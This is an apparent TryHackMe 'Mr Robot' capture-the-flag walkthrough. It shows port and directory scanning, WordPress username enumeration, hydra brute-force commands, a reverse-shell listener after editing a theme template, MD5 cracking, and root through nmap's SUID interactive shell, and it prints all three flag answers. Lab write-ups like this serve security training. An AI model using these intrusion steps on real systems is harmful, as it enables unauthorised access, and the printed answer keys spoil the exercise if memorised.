# TryHackMe - Mr Robot

## 📌 Task 1: Connect to the network

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.189.18
```

### 🔍 Nmap Scan

**Using all ports takes forver**

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
PORT    STATE SERVICE  VERSION                                                               
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)         
| ssh-hostkey:                                                                               
|   3072 3c:c0:d8:47:81:bf:bf:1c:ac:2d:d2:36:8a:3b:18:00 (RSA)                               
|   256 30:75:fd:a7:11:2b:e1:65:b2:3b:c7:82:15:c5:16:e8 (ECDSA)                              
|_  256 13:07:cb:6e:36:cc:2a:a1:52:16:8c:86:36:c2:03:be (ED25519)                            
80/tcp  open  http     Apache httpd                                                          
|_http-title: Site doesn't have a title (text/html).                                         
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.189.18 -x .php,.txt,.html
```

**Results**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 214]
/index.html           (Status: 200) [Size: 1188]
/images               (Status: 301) [Size: 235] [--> http://10.10.189.18/images/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.189.18/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.189.18/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.189.18/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.189.18/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.189.18/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.189.18/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.189.18/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.189.18/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.189.18/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.189.18/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.189.18/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.189.18/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2664]
/wp-login.php         (Status: 200) [Size: 2664]
/css                  (Status: 301) [Size: 232] [--> http://10.10.189.18/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.189.18/feed/]
/license              (Status: 200) [Size: 309]
/license.txt          (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.189.18/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.189.18/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.189.18/Image/]
/wp-register.php      (Status: 301) [Size: 0] [--> http://10.10.189.18/wp-login.php?action=register]                                                                                      
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://10.10.189.18/feed/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.189.18/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.189.18/]
/readme               (Status: 200) [Size: 64]
/readme.html          (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.189.18/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.189.18/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.189.18/wp-admin/]
```

## 📌 Task 2: Hack the machine

Let's have a look at robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
```bash
http://10.10.189.18/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```
**Q. What is key 1?
A. 073403c8a58a1f80d943455fb30724b9

### Foothold

## Login and registration page found

There is a login and register page. Let's play with that
Says disable in the URL string. Chaning that to enable allows us to register.
```
http://10.10.189.18/wp-login.php?registration=enabled
```
However, I can't register a new user. However, forget password works. I can now test user names!
```
http://10.10.189.18/wp-login.php?action=lostpassword
```
Let's try some of the main characters in Mr Robit

elliot - works. The rest say no username found

## Guess Elliot's password

I tried SQLmap but that didn't work
```bash
sqlmap --forms -a -u http://10.10.189.18/wp-login.php
```

Let's move on to hydra

First I jump into burpsuite and grab the forms

**Results**
```
log=elliot&pwd=elliot&wp-submit=Log+In
```

```bash
hydra -l elliot -P /usr/share/wordlists/rockyou.txt 10.10.189.18 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

### SSH password with Hydra
```bash
hydra -l elliot -P /usr/share/wordlists/rockyou.txt ssh://10.10.189.18
```

**No, they were all taking too long. It's normally much simpler. Let's try something else

## Move on to WP exploit

One of the pages is /0/ looking at the source it seems to be running twenty fifteen ver 20141010. That has vulnerability both SQL injection and cross side scripting! Maybe that is how I get in!

Let's see if the exploit is there!
```
10.10.189.18/wp-content/themes/genericons/example.html
Nope :-(
```

Openend license.txt to see if I can find a version
However, to my surprise there at the very end of the file is a base64 code
Putting in cybershef revealed
```
elliot:ER28-0652
```

Now I can login to the WP

I tried to upload a file in media. That didn't work
In the end I has to look online - silly I missed the templates link in the admin page!
In there, you can edit files. Picking (like everyone with walkthroughs) I edited 404.php using an example from pentestmonkey.com

open a listener (now using rlwrap for a better experience)
```bash
rlwrap nc -nlvp 8888
```

I am in!

Moving to home/robot I can see the next flag but don't have permission. However, there is a MD5 I can use. 
robot:c3fcd3d76192e4007dfb496cca67e13b

### Upgrade perms

A quick google found me a password decoder for MD5. I could have also used john the ripper!
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 
```
The answer is abcdefghijklmnopqrstuvwxyz
```bash
ssh robot@10.10.189.18
```
```bash
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
**Q. What is key 2?
A. 822c73956184f694993bede3eb39f959

### Root
 
I uploaded linpeas.sh and ran it.

It said there was Vulnerable to CVE-2021-3560

I donwloaded the exploit from exploitdb and tried it. Nope didn't work

Further down linpeas results showed nmap has the suid bit set and it was vulnerable

A quick look on GTFOBins. I can get a root shell

```bash
nmap --interactive
nmap> !sh
```

Yay, I am root!

```bash
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

**Q. What is key 3?
A. 04787ddef27c3dee1ee161b21670b4e4
